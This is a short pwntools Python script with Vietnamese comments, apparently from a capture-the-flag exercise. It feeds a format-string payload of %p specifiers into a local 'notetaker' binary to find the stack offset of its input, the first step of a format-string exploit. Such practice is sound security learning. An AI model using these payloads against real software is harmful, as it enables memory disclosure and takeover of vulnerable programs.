from pwn import *

# Cấu hình
exe_path = './notetaker'
ld_path = './libs/ld-2.23.so'
libc_path = './libs/libc.so.6'

# Chạy process
try:
    p = process([ld_path, exe_path], env={"LD_PRELOAD": libc_path})
except:
    p = process(exe_path)

log.info("Dang do tim Offset...")

# Payload: AAAAAAAA (để nhận diện) + in ra các vị trí từ 6 đến 12
# 0x4141414141414141 la AAAAAAAA trong Hex
payload = b'AAAAAAAA|%6$p|%7$p|%8$p|%9$p|%10$p|%11$p|%12$p'

p.sendlineafter(b'> ', b'2')
p.sendlineafter(b'Enter the note: ', payload)

p.sendlineafter(b'> ', b'1')

# Đọc kết quả
try:
    result = p.recvline().decode().strip()
    log.info(f"OUTPUT: {result}")
    
    # Tìm chuỗi 0x41414141...
    parts = result.split('|')
    found = False
    for i, part in enumerate(parts):
        if '0x4141414141414141' in part:
            real_offset = 6 + (i - 1) # i=0 là AAAAAAAA, i=1 là %6$p
            log.success(f"!!! TIM THAY OFFSET CHINH XAC LA: {real_offset} !!!")
            found = True
            break
            
    if not found:
        log.error("Van chua thay AAAAAAAA. Co the offset lon hon 12.")

except Exception as e:
    log.error(f"Loi: {e}")

p.close()